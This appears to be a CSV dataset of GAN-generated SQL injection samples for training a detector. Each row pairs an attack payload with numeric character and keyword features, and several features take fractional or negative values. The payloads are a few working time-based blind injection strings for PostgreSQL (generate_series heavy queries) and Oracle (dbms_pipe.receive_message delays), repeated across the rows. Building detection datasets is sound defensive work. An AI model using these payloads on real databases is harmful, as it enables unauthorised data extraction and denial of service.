id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000031,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.555495085127005,123.92153930664062,40.75819778442383,14.856444358825684,44.351287841796875,-0.0009443892049603164,59.72336959838867,24.753520965576172,0.8356093168258667,0.27609774470329285,0.15945635735988617,0.3680201470851898,0.13601632416248322,3.6017906665802,0.7818377017974854,1.0020716190338135,1.0281583070755005,0.010688450187444687,0.05882159620523453,0.004321885760873556,3.9551587104797363,4.491964340209961,1.2915555238723755,0.030863827094435692,1.4973610639572144,0.1636633276939392,0.006578210275620222,0.05707733705639839,0.4226129949092865,0.48922789096832275,0.022902868688106537,-0.022448092699050903,0.02933369018137455,0.01022862084209919,0.5298799276351929,1.5907620191574097,3.0667989253997803,0.8091173768043518,0.5666069388389587,0.014020636677742004,0.4092603325843811,0.5177589058876038,0.02741418033838272,-0.04669693857431412,0.22857873141765594,-0.14430129528045654,-0.07250570505857468,0.08426403999328613,0.08948986232280731,0.18449580669403076,-0.030887052416801453,0.06247950345277786,-0.07839800417423248,0.1768239140510559,-0.016447536647319794,-0.3090873956680298,-0.003159215208142996,0.1482808142900467,0.09567302465438843,0.3358616530895233,-0.028846122324466705,-0.029629748314619064,-0.14691603183746338,1.7144697904586792,0.41292062401771545,0.03176867589354515,0.002530094003304839,0.24797400832176208,0.0330129899084568,-0.11932814866304398,0.05153273791074753,-0.1497032791376114,0.09992332756519318,0.018040919676423073,0.1456770896911621,-0.046300243586301804,1.0077754259109497,0.42307066917419434,-0.1147099956870079,0.0684109553694725,0.040181513875722885,4.425670146942139,0.9977591037750244,0.10681083798408508,-0.11564068496227264,0.08231839537620544,0.10283756256103516,0.04397541657090187,0.010835490189492702
GAN_000032,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.600598757216341,133.2476043701172,43.470008850097656,18.117935180664062,43.32155990600586,0.01161512453109026,54.08686828613281,23.583080291748047,1.0230722427368164,0.2736205756664276,0.16534754633903503,0.35705429315567017,0.1391487568616867,3.6550941467285156,1.05124032497406,0.8430888056755066,1.1530245542526245,0.007911661639809608,0.07112091034650803,0.016646189615130424,4.0872015953063965,4.407533168792725,1.6545755863189697,0.015321274287998676,1.5160632133483887,0.1916746348142624,0.012188355438411236,0.25054454803466797,1.0448658466339111,0.538273274898529,0.023830145597457886,-0.18115487694740295,0.06154526025056839,0.16644559800624847,0.46867090463638306,1.6886534690856934,3.0565755367279053,0.659343421459198,0.5274538993835449,-0.24608778953552246,0.4261508882045746,0.48116886615753174,0.13580229878425598,-0.09176037460565567,0.04486122727394104,-0.0035006701946258545,-0.10033544898033142,0.13538172841072083,0.17554989457130432,0.14467982947826385,0.04711198806762695,0.09460243582725525,-0.16887266933918,0.011499911546707153,-0.023705385625362396,0.03415564447641373,0.00201677018776536,0.2562970221042633,-0.16199001669883728,0.23354610800743103,0.03845299780368805,0.19667038321495056,-0.09407762438058853,1.9004731178283691,0.2634858191013336,0.033484093844890594,-0.00028088147519156337,0.0317375585436821,0.09905112534761429,-0.03834489732980728,-0.05959372967481613,-0.2782232165336609,0.06633926928043365,0.00305788591504097,0.07038594782352448,0.053331080824136734,0.9045451879501343,0.3720173239707947,-0.07528718560934067,0.07295376062393188,-0.07250623404979706,4.557301044464111,0.962965190410614,0.2610810399055481,-0.15044064819812775,0.13938561081886292,-0.07454904913902283,-0.0248371921479702,0.00783892534673214
GAN_000033,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.7554421715029807,130.15052795410156,40.51848220825195,17.731929779052734,46.43396759033203,0.020285457372665405,53.46019744873047,21.58799934387207,1.1520076990127563,0.3074738085269928,0.173980712890625,0.3793749213218689,0.1371704339981079,3.612126111984253,0.766825795173645,0.9471071362495422,1.133035659790039,0.06938486546278,0.08968649804592133,0.016048531979322433,4.039700508117676,4.594010353088379,1.4085445404052734,0.02065080776810646,1.588382601737976,0.3050917983055115,-0.0027796984650194645,0.22332258522510529,1.0074691772460938,0.4785626232624054,0.03933313116431236,-0.2033362239599228,0.05694599077105522,0.0017100907862186432,0.4430104196071625,1.7298694849014282,3.1100358963012695,0.8401161432266235,0.5658753514289856,-0.06318246573209763,0.3474234342575073,0.40333855152130127,-0.030890479683876038,0.04951401799917221,-0.03332879766821861,-0.1771935224533081,-0.24497732520103455,0.17071297764778137,0.15361222624778748,0.15937763452529907,0.0870828852057457,0.031156159937381744,-0.27139389514923096,0.17733165621757507,0.06464631855487823,-0.003331698477268219,-0.012382322922348976,0.2004380226135254,-0.08621872961521149,-0.002340875566005707,0.09697018563747406,0.08990342915058136,-0.0952698364853859,2.1086907386779785,0.29214608669281006,0.011456256732344627,0.0052302535623312,0.12940096855163574,0.13869202136993408,0.05054030939936638,0.1822885274887085,-0.10355932265520096,0.06921238452196121,0.010653538629412651,0.3119308352470398,0.01741752028465271,0.8709126114845276,0.4662102460861206,-0.01122353971004486,0.09577176719903946,-0.01400826871395111,4.25026273727417,0.9324332475662231,0.1740911900997162,-0.05929775536060333,0.11916034668684006,-0.0660782903432846,-0.06385443359613419,-0.0019383333856239915
GAN_000034,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.847345182365891,144.65975952148438,35.905330657958984,15.639198303222656,47.47965621948242,-0.028462793678045273,57.638858795166016,27.677471160888672,1.0297503471374512,0.23221589624881744,0.1707731932401657,0.37318381667137146,0.142525777220726,3.5870823860168457,1.0621871948242188,1.5073140859603882,1.3554255962371826,0.07605534046888351,0.08844519406557083,0.007800085470080376,4.507390975952148,3.6596570014953613,1.3640536069869995,0.01945691928267479,1.5325318574905396,0.3725109398365021,-0.007546734530478716,-0.1397067755460739,0.8181310892105103,0.6688785552978516,0.023828504607081413,-0.1825181543827057,0.0338071770966053,0.12070311605930328,0.48335182666778564,1.6449816226959229,2.295663833618164,0.43130651116371155,0.6136625409126282,-0.09249015152454376,0.4321337640285492,0.42007994651794434,0.08163214474916458,0.06044067442417145,0.23368875682353973,-0.14230629801750183,-0.12097539007663727,0.09380145370960236,0.12465433776378632,0.2147235870361328,-0.09140358865261078,0.1379215121269226,-0.023964911699295044,0.13627362251281738,-0.24110832810401917,-0.13280989229679108,0.005124310497194529,0.2635161578655243,0.012727931141853333,0.06053103506565094,0.0735936313867569,0.014008238911628723,-0.2119809091091156,2.080016851425171,0.1929665356874466,0.009091373533010483,0.006199339404702187,0.34253808856010437,0.08916152268648148,0.24754026532173157,-0.12512287497520447,-0.17571216821670532,0.06496024131774902,0.029946230351924896,0.43042290210723877,0.12425240874290466,1.013944387435913,0.36384153366088867,-0.23264044523239136,0.005565018393099308,0.21191652119159698,4.366985321044922,1.0399705171585083,0.18723177909851074,-0.18523326516151428,0.1730257272720337,0.1264386624097824,0.3247898817062378,0.0012144077336415648
GAN_000035,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.7471916342851426,126.23764038085938,31.71950912475586,15.531051635742188,42.21818923950195,-0.01654517464339733,61.07915496826172,26.859865188598633,1.2424534559249878,0.23261620104312897,0.176881805062294,0.3662869334220886,0.14450541138648987,3.605882167816162,0.9532800912857056,1.1722229719161987,1.186190128326416,0.0682634636759758,0.06864070892333984,0.020856209099292755,3.449373483657837,3.682149648666382,1.2424618005752563,0.008186650462448597,1.574722170829773,0.32526808977127075,-0.0575391948223114,-0.02218840830028057,0.37169793248176575,0.6254293918609619,0.036194637417793274,-0.11689915508031845,0.014974831603467464,0.1793372631072998,0.5435383915901184,1.6165616512298584,2.293145179748535,0.25738435983657837,0.4532512426376343,-0.046671509742736816,0.3507060110569,0.44470351934432983,-0.11027459800243378,-0.035015858709812164,0.011697232723236084,0.10667887330055237,-0.18761925399303436,0.12064982205629349,0.09358428418636322,0.14753222465515137,-0.09143540263175964,0.11218290776014328,-0.22783347964286804,0.004995383322238922,-0.0701872780919075,-0.10152894258499146,-0.020317282527685165,0.20667865872383118,0.17373014986515045,-0.11325324326753616,-0.06808053702116013,0.3718982934951782,-0.14126580953598022,2.5219287872314453,0.05859360843896866,-0.024491822347044945,0.008901610970497131,0.35200533270835876,0.2699942886829376,0.07698118686676025,0.06499791890382767,-0.03314165025949478,0.24419189989566803,0.06656447052955627,0.3896801173686981,0.12047134339809418,0.9766901731491089,0.3100001811981201,-0.22412660717964172,-0.027351556345820427,0.1407448649406433,4.236355304718018,1.0299530029296875,0.27326706051826477,-0.2877749502658844,-0.011059708893299103,0.08193017542362213,0.4706440269947052,-0.014343688264489174
GAN_000036,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.8442474874098482,124.83272552490234,39.82482147216797,18.49648094177246,47.54535675048828,-0.040802326053380966,51.14585494995117,25.48526382446289,0.9972341656684875,0.26898348331451416,0.17979490756988525,0.35790422558784485,0.1453830599784851,3.6097497940063477,1.4324864149093628,0.8169029951095581,1.2898776531219482,0.07755659520626068,0.09271189570426941,0.03876670449972153,4.081474304199219,4.418123722076416,2.090886116027832,0.012695654295384884,1.4483039379119873,0.23828135430812836,-0.02673831395804882,0.1475214660167694,1.0930193662643433,0.6217442750930786,0.015689974650740623,-0.4418480694293976,0.11684076488018036,0.3367927670478821,0.460651695728302,1.7184518575668335,2.6573967933654785,0.6577860713005066,0.555425226688385,-0.20361016690731049,0.42715272307395935,0.4189895689487457,0.2185908704996109,-0.12092342227697372,0.08682388067245483,0.07296867668628693,-0.027366414666175842,0.13567303121089935,0.15895995497703552,0.1936415135860443,-0.005686640739440918,0.104127898812294,0.009535595774650574,-0.17935198545455933,-0.19494184851646423,0.03743739426136017,0.011961597017943859,0.3081359267234802,-0.2013828456401825,0.17710426449775696,-0.06720039248466492,0.05196493864059448,-0.03418318182229996,2.5629122257232666,-0.00462767668068409,0.027689995244145393,-0.00656165461987257,0.0021356791257858276,0.16067767143249512,0.14975501596927643,-0.04967930167913437,-0.26902830600738525,0.117837093770504,0.013543648645281792,0.1459316909313202,0.0927039384841919,1.0651929378509521,0.3705472946166992,-0.21356868743896484,0.10168946534395218,-0.07501710951328278,5.122033596038818,1.0010708570480347,0.28911298513412476,-0.24463605880737305,0.15874430537223816,-0.08387909829616547,0.19778379797935486,0.003735950216650963
GAN_000037,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.5432139693498774,127.42386627197266,38.526119232177734,18.19174575805664,46.66872787475586,-0.023378178477287292,52.89958953857422,25.64003562927246,1.2508292198181152,0.25502100586891174,0.17134393751621246,0.36301738023757935,0.14373143017292023,3.561208724975586,1.2312378883361816,0.9620095491409302,1.3064210414886475,0.07248588651418686,0.050413064658641815,0.006677451077848673,3.3549904823303223,4.525387763977051,1.3611505031585693,0.018940819427371025,1.5061242580413818,0.14677585661411285,-0.024805495515465736,0.09849448502063751,0.3828810751438141,0.5388283729553223,0.02206314355134964,-0.030663393437862396,0.05012832581996918,0.2757323384284973,0.5606113076210022,1.5929819345474243,2.573444366455078,0.5308884978294373,0.5238185524940491,-0.06972713768482208,0.3349379599094391,0.4213588535785675,-0.047166138887405396,-0.13678821921348572,-0.009491488337516785,0.09181084483861923,-0.23797225952148438,0.0777423158288002,0.09952359646558762,0.09420876204967499,-0.08937261998653412,0.12631623446941376,-0.14419829845428467,0.017392300069332123,-0.11369210481643677,-0.043914854526519775,-0.0022840327583253384,0.2751922607421875,-0.03557806462049484,-0.06684770435094833,-0.07976734638214111,0.10791170597076416,-0.04911499470472336,2.354053258895874,0.2045552134513855,0.008427366614341736,0.03006036765873432,0.01270497590303421,0.08923117816448212,0.03686203435063362,0.07461850345134735,-0.1459662914276123,0.10045456886291504,0.045967526733875275,0.13066546618938446,0.22290444374084473,1.0009057521820068,0.36685365438461304,-0.1497693657875061,0.0522790402173996,-0.03833949565887451,4.687746047973633,0.9728091955184937,0.12555894255638123,-0.2974051237106323,0.07974004745483398,0.014542583376169205,0.2104327231645584,-0.015271859243512154
GAN_000038,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.9851122470674754,120.40000915527344,27.348228454589844,15.076885223388672,35.49761962890625,0.006540676578879356,65.34223175048828,26.99212646484375,0.8851351141929626,0.25262707471847534,0.19030730426311493,0.36340105533599854,0.13947784900665283,3.5824999809265137,0.5467168092727661,0.9460457563400269,1.0054105520248413,0.0868779867887497,0.0451858714222908,0.004934272263199091,4.368541717529297,4.111486911773682,0.815249502658844,0.025337066501379013,1.5648548603057861,0.44983309507369995,-0.025361934676766396,0.06309375166893005,0.9526224732398987,0.547897458076477,0.03675766661763191,-0.2907053530216217,0.07670675963163376,-0.04611076042056084,0.4385552704334259,1.8214056491851807,3.2123405933380127,0.6359696984291077,0.5728568434715271,-0.07791132479906082,0.44276657700538635,0.45203787088394165,0.09342661499977112,-0.01561030000448227,0.43214547634124756,-0.21250486373901367,0.02510911226272583,0.10259811580181122,0.1589226871728897,0.2241055816411972,-0.003443479537963867,-0.003092422615736723,-0.041895776987075806,0.15275543928146362,-0.06733518093824387,-0.08713915944099426,-0.011996237561106682,0.25722596049308777,-0.24165432155132294,0.24363920092582703,0.11087901890277863,-0.06809406727552414,-0.13463351130485535,2.4197704792022705,0.5091411471366882,0.03307203948497772,0.0100536635145545,0.30167433619499207,0.009779197163879871,-0.03691061586141586,0.010732576251029968,-0.1384962797164917,0.1858527511358261,0.0015524420887231827,0.23374901711940765,0.09772761911153793,0.9982351660728455,0.37201452255249023,-0.16334998607635498,0.18733038008213043,0.28118228912353516,4.959287166595459,1.0156358480453491,0.2120676040649414,-0.03169938921928406,0.1559789925813675,0.07906506955623627,0.03244083747267723,0.009901410900056362
GAN_000039,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.5609618590078655,137.77371215820312,41.75458908081055,17.777267456054688,54.0802001953125,0.0029178482946008444,55.28706359863281,22.89359474182129,1.0189324617385864,0.2915959358215332,0.15633627772331238,0.3636818528175354,0.13916806876659393,3.6497416496276855,1.0599095821380615,1.0026283264160156,1.11769700050354,0.02882063388824463,0.09579480439424515,0.008196462877094746,4.090435981750488,5.020430564880371,1.7941488027572632,0.023661037907004356,1.5448670387268066,0.16640691459178925,-0.0010995051125064492,0.0742463767528534,0.6530255675315857,0.5539514422416687,0.02393564023077488,-0.1139221265912056,0.054988130927085876,0.030788637697696686,0.5073680281639099,1.609123706817627,3.307607412338257,0.6719833612442017,0.5851861834526062,-0.11292403936386108,0.39109188318252563,0.4612344205379486,-0.08906467258930206,-0.032872334122657776,-0.023519262671470642,0.01842590421438217,-0.19982993602752686,0.0888952910900116,0.16968278586864471,0.17170649766921997,-0.014738723635673523,0.06141892820596695,-0.07958576083183289,0.04072050750255585,-0.04074821248650551,-0.12754255533218384,-0.00255283759906888,0.1708259880542755,0.12566129863262177,0.12720124423503876,-0.010769188404083252,0.09720245003700256,0.014040254056453705,1.3560563325881958,0.0318068228662014,0.010990852490067482,-0.0017930736066773534,0.09775147587060928,0.12780693173408508,0.09959780424833298,-0.06957810372114182,0.002301662229001522,0.13363061845302582,0.022513972595334053,0.20534677803516388,-0.05689283087849617,0.9858742356300354,0.48804304003715515,7.21365213394165e-05,0.05190449208021164,-0.030039183795452118,4.79201602935791,0.9807091951370239,0.14871922135353088,-0.04907353222370148,0.011449858546257019,0.03230268880724907,0.2236933410167694,0.006994140800088644
GAN_000040,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.6149124968386452,129.47779846191406,41.132389068603516,16.96306800842285,38.617401123046875,-0.011951458640396595,53.198997497558594,24.468584060668945,1.0522657632827759,0.23874497413635254,0.167193204164505,0.362773597240448,0.14044928550720215,3.6002955436706543,1.1003332138061523,0.9073294401168823,1.203470230102539,0.04535922408103943,0.07267679274082184,0.004067329689860344,3.7852256298065186,4.158326148986816,1.379799485206604,0.01744857430458069,1.4751005172729492,0.21908636391162872,-0.013717575930058956,0.10969953238964081,0.8750535249710083,0.556677520275116,0.03383573889732361,-0.1876189112663269,0.03469587489962578,0.26354706287384033,0.4867521822452545,1.6256450414657593,2.801736354827881,0.5507127046585083,0.4499552845954895,-0.19683940708637238,0.40008240938186646,0.4392238259315491,0.044244617223739624,-0.16105937957763672,0.051873087882995605,-0.08589354902505875,-0.12855374813079834,0.09854461252689362,0.1359281837940216,0.1686849296092987,0.001051492989063263,0.11046814173460007,-0.08488829433917999,0.07301259785890579,-0.11611883342266083,-0.012914828956127167,-0.0025884867645800114,0.3248385488986969,-0.1202663779258728,0.13446933031082153,-0.06158645451068878,0.20612558722496033,-0.06747644394636154,2.3607919216156006,0.20012639462947845,0.03423608839511871,0.007533748634159565,0.04500741511583328,0.14982672035694122,0.020568035542964935,-0.03526240587234497,-0.21157902479171753,0.13207387924194336,0.02256074920296669,0.18314211070537567,0.13798914849758148,0.9585367441177368,0.34972521662712097,-0.18002736568450928,0.05708862096071243,0.09718053787946701,4.407349586486816,1.0293183326721191,0.30723074078559875,-0.18666303157806396,0.2012394368648529,0.0920671671628952,0.12138400971889496,0.002759436145424843
GAN_000041,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.702412565904398,127.9563980102539,34.11959457397461,16.279930114746094,41.068458557128906,0.030522868037223816,57.82775115966797,23.695100784301758,0.9084092974662781,0.2715361416339874,0.17352676391601562,0.35925909876823425,0.1385759562253952,3.5821714401245117,0.621315598487854,0.8330578804016113,0.9074752330780029,0.043386172503232956,0.03334309533238411,-0.00557715306058526,3.729968547821045,4.438605308532715,1.0158456563949585,0.027357308194041252,1.6206905841827393,0.3293188214302063,-0.0146652115508914,0.15223586559295654,0.2751113772392273,0.5339373350143433,0.016453266143798828,-0.13813377916812897,0.04158090800046921,-0.07850803434848785,0.4409545361995697,1.78536057472229,3.875723361968994,0.7450304627418518,0.5316911935806274,-0.13214460015296936,0.38851895928382874,0.5083444118499756,0.009259700775146484,-0.15270867943763733,0.2981609106063843,-0.19055572152137756,-0.13055159151554108,0.06633128225803375,0.12108618021011353,0.15505757927894592,-0.020842477679252625,0.04940950870513916,-0.21868523955345154,0.2907555401325226,0.1453026533126831,-0.16465447843074799,-0.013770706951618195,0.1672687828540802,0.01937764883041382,0.27905333042144775,0.028868407011032104,-0.06704487651586533,-0.15551376342773438,2.3595993518829346,0.28337225317955017,0.041622940450906754,0.009116741828620434,0.15762850642204285,0.06215175241231918,0.029128052294254303,0.07060107588768005,-0.08170609176158905,0.139946848154068,0.010940111242234707,0.15445247292518616,0.08035539090633392,0.9759166240692139,0.47623181343078613,-0.22715818881988525,0.1265016347169876,0.31213676929473877,5.359949111938477,0.997317373752594,0.278784841299057,0.10857507586479187,-0.07382557541131973,-0.061033524572849274,0.0437757633626461,0.014202773571014404
GAN_000042,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.5650227890513393,136.27622985839844,41.3719596862793,17.307437896728516,41.260684967041016,0.012826451100409031,52.335418701171875,22.55827522277832,1.0874507427215576,0.28751739859580994,0.17118525505065918,0.3599373996257782,0.1406601220369339,3.6094443798065186,0.9533153176307678,0.7101747393608093,1.024314045906067,0.03633694350719452,0.05552451312541962,0.0031524733640253544,3.5737814903259277,4.1524457931518555,1.2158441543579102,0.019694697111845016,1.586317777633667,0.16334809362888336,-0.0005583675228990614,0.2610207200050354,0.7396377325057983,0.48486921191215515,0.03708380460739136,-0.13195626437664032,0.04593782499432564,0.11648687720298767,0.4428494870662689,1.6918895244598389,3.2311251163482666,0.7222192287445068,0.5309202075004578,-0.06150315701961517,0.3322891592979431,0.45248302817344666,0.1295352429151535,-0.07096195966005325,0.04639625549316406,-0.02368304878473282,-0.16592389345169067,0.11055327951908112,0.09210426360368729,0.11059528589248657,0.051488086581230164,0.0994771271944046,-0.20038080215454102,0.10905332118272781,0.06967663764953613,-0.0006198883056640625,-0.004283348564058542,0.21245279908180237,-0.1111837700009346,0.1943970024585724,-0.04070877283811569,0.018947020173072815,0.012564338743686676,2.111651659011841,0.3203442692756653,0.03485676646232605,0.014644870534539223,0.030664481222629547,0.015582362189888954,-0.07734742015600204,0.1461258828639984,-0.15919922292232513,0.06868636608123779,0.016289955005049706,0.060248963534832,0.16971328854560852,0.8679318428039551,0.45158228278160095,-0.119007907807827,0.10628888756036758,0.09060033410787582,4.991100311279297,0.937682569026947,0.23966562747955322,-0.0009738057851791382,0.10552618652582169,-0.09240080416202545,-0.04408366605639458,-0.002159769181162119
GAN_000043,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.5941481239132442,133.09779357910156,41.09885025024414,14.456398010253906,46.00490188598633,0.01629665307700634,55.832763671875,24.933286666870117,1.2324438095092773,0.25141459703445435,0.16924035549163818,0.3715673089027405,0.13811779022216797,3.5244534015655518,0.6797224879264832,1.2168372869491577,1.174788475036621,0.05339648947119713,0.0518314354121685,-0.011882136575877666,3.532694101333618,4.2876482009887695,1.1650140285491943,0.021860208362340927,1.5861077308654785,0.26550906896591187,-0.025840429589152336,-0.04678840562701225,0.2780507802963257,0.5009063482284546,0.028596140444278717,0.09247177094221115,0.05949800834059715,0.10454092919826508,0.6066846251487732,1.5614054203033447,2.5752668380737305,0.6164125800132751,0.5488195419311523,-0.0394076406955719,0.338974267244339,0.43138253688812256,-0.2132944017648697,-0.026887178421020508,0.036478206515312195,-0.20842009782791138,-0.16345751285552979,0.036251604557037354,0.113104909658432,0.15726138651371002,-0.1127254068851471,0.03604711592197418,-0.17049267888069153,0.2063675820827484,-0.023483306169509888,-0.16923888027668,-0.004525321070104837,0.12631595134735107,0.2073499709367752,0.11658397316932678,0.015424519777297974,0.10821682214736938,-0.01603700965642929,1.7313288450241089,0.3947351276874542,0.015930265188217163,0.04119398072361946,0.18462198972702026,0.05930984765291214,0.03494000807404518,0.014678265899419785,-0.21657229959964752,0.07947403937578201,0.030094660818576813,0.3295254111289978,0.10375108569860458,1.0334625244140625,0.497422993183136,-0.21105530858039856,-0.027788279578089714,0.14498858153820038,3.830601930618286,1.0201563835144043,0.2016410529613495,-0.08270353078842163,0.04736558347940445,0.07019434869289398,0.07298275828361511,-0.000767892284784466
GAN_000044,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.6994470048351378,124.71237182617188,35.49662780761719,15.738027572631836,42.2204475402832,-0.03370044752955437,55.9933967590332,28.914505004882812,1.285126805305481,0.2192966192960739,0.1730564683675766,0.3653081953525543,0.14307169616222382,3.574106454849243,1.1377571821212769,1.2510794401168823,1.3660165071487427,0.07211118936538696,0.052515026181936264,0.0027434700168669224,3.649921178817749,3.709895133972168,1.1798515319824219,0.01373466569930315,1.5243983268737793,0.1635652482509613,-0.04219001531600952,-0.08642251789569855,0.37557098269462585,0.5815578699111938,0.024707231670618057,0.006911002099514008,0.030947083607316017,0.32978710532188416,0.6052235960960388,1.563283920288086,1.8864010572433472,0.3981638550758362,0.5086696147918701,-0.05855781212449074,0.340472549200058,0.41849106550216675,-0.08881251513957977,-0.04533334821462631,-0.007290743291378021,0.018541261553764343,-0.22293305397033691,0.07759062945842743,0.08064024150371552,0.11270499974489212,-0.14366954565048218,0.13574938476085663,-0.22312796115875244,-0.03376404196023941,-0.2155258059501648,-0.0795372724533081,-0.012696860358119011,0.24366620182991028,0.0672791451215744,-0.09562613815069199,-0.11615979671478271,0.28307101130485535,-0.09908277541399002,2.478707790374756,0.19528281688690186,-0.012428997084498405,0.03469778597354889,0.11833909898996353,0.16224819421768188,0.07948285341262817,0.05743306130170822,-0.10950654745101929,0.2727407217025757,0.06291111558675766,0.3315737545490265,0.2456061691045761,1.0209338665008545,0.2929135262966156,-0.2519635856151581,-0.011235400103032589,0.018374107778072357,4.024600028991699,1.0373460054397583,0.22980347275733948,-0.43306249380111694,0.11777317523956299,0.17612706124782562,0.3239016830921173,-0.014170322567224503
GAN_000045,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.600646420020103,137.54949951171875,39.28234100341797,18.545759201049805,54.4084587097168,0.005402568727731705,54.733211517333984,23.548397064208984,1.0382647514343262,0.28578266501426697,0.16332383453845978,0.3609599173069,0.14377108216285706,3.5570125579833984,1.1408575773239136,0.9376794695854187,1.2156882286071777,0.050452154129743576,0.07148106396198273,0.01122351735830307,3.6048409938812256,4.803123950958252,1.741221308708191,0.02391957864165306,1.557241439819336,0.22244833409786224,-0.011550321243703365,0.1675492823123932,0.5383251309394836,0.5847562551498413,0.011745541356503963,-0.1315591037273407,0.07537735253572464,0.10547412931919098,0.4884741008281708,1.734727382659912,3.5417470932006836,0.635643720626831,0.553987979888916,-0.1856115758419037,0.38402295112609863,0.44762420654296875,-0.009028390049934387,-0.1066078171133995,0.12166912853717804,0.08481967449188232,-0.19072136282920837,0.07105326652526855,0.15124410390853882,0.14945638179779053,-0.03866639733314514,0.08106783777475357,-0.051235347986221313,0.08994575589895248,-0.04026853293180466,-0.10784731805324554,0.0020430590957403183,0.23751583695411682,-0.02756095677614212,0.06381029635667801,0.08487142622470856,0.03915546089410782,-0.06237522512674332,1.8556673526763916,0.10161206871271133,0.024229800328612328,0.014127167873084545,0.0587918683886528,0.12777315080165863,0.13774526119232178,-0.08069077879190445,-0.12194409221410751,-3.213062882423401e-05,0.021925566717982292,0.18869909644126892,0.07569186389446259,1.036197543144226,0.4633540213108063,-0.0530962273478508,0.06559351831674576,0.0057265907526016235,5.3405022621154785,0.965506374835968,0.17669224739074707,-0.1344275325536728,-0.023354940116405487,-0.12038351595401764,0.25088611245155334,-0.0012295792112126946
